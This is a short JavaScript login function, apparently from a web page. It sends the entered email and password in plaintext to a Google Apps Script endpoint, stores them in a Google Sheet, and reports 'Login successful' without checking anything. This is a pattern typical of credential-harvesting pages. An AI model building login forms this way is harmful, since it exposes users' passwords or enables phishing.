const API_URL = "https://script.google.com/macros/s/AKfycbzT7uISsv4-oZ8eKRmINKCDlhtxLSPGPSGYAhqaMVVj7qOpNMDUZ6zozqo6dWyiNJP1/exec";

async function login() {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("Please fill all fields");
    return;
  }

  try {
    const res = await fetch(API_URL, {
      method: "POST",
      // ❌ removed no-cors
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        email: email,
        password: password
      })
    });

    const data = await res.json(); // ✅ now we can read response

    alert("Login successful ✔ Data stored in Google Sheet");

    document.getElementById("msg").innerText =
      data.message || ("Saved: " + email);

  } catch (err) {
    console.error(err);
    alert("Error sending data");
  }
}
